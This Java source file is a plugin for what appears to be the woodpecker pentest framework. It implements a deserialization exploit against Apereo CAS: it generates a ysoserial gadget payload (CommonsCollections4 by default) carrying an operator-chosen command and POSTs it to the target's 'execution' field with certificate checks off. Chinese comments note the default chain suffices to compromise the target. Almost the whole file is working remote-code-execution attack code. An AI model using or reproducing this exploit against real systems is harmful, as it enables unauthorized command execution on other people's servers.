package me.gv7.woodpecker.vuldb.execution.deserial;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.requests.Requests;

import javax.swing.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class CustomSerialDataExploit implements IExploit {

    public void basicInfoPrint(String targetURL, Map<String, String> customArgs, JTextArea taResult){
        String gadge = customArgs.get("gadget");
        String shellType = customArgs.get("shell_type");
        taResult.setText("目标URL: "+targetURL+"\n");
        taResult.setText("利用链: "+gadge+"\n");
        taResult.setText("shell类型: "+shellType+"\n");
    }



    @Override
    public String getExploitTabCaption() {
        return "Cas 反序列化";
    }

    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        IArgsUsageBinder binder = VulPluginImpl.callbacks.getPluginHelper().createArgsUsageBinder();
        List<IArg> args = new ArrayList<>();
        final IArg gadge = VulPluginImpl.callbacks.getPluginHelper().createArg();
        gadge.setName("yso_gadget");
        gadge.setDefaultValue("CommonsCollections4");
        gadge.setRequired(true);
        gadge.setDescription("cc链，默认用cc4就能打死");

        final IArg shellType = VulPluginImpl.callbacks.getPluginHelper().createArg();
        shellType.setName("yso_cmd");
        shellType.setDefaultValue("whoami");
        shellType.setRequired(true);
        shellType.setDescription("需要执行的命令");

        args.add(gadge);
        args.add(shellType);
        binder.setArgsList(args);
        binder.setUsage("gadget=URLDNS\nshell_type=http://www.baidu.com");
        return binder;
    }


    @Override
    public void doExploit(ITarget url, Map<String, Object> args, IResultOutput result) throws Throwable {
        String httpAddress = url.getAddress();
        String gadge = (String)args.get("yso_gadget");
        String command = (String)args.get("yso_cmd");

        result.rawPrintln("\n\n调用类: "+gadge+"\ncommand: "+command+"\n");

        CommonUtil.basicCheckVuln(httpAddress, result);

        String payload = CommonUtil.generate(gadge, command);
        Map<String,String> requestBody = new HashMap<>();
        requestBody.put("execution", payload);
        Requests.post(httpAddress).verify(false).body(requestBody).send();
        result.successPrintln("发送成功,请手工验证");

    }
}
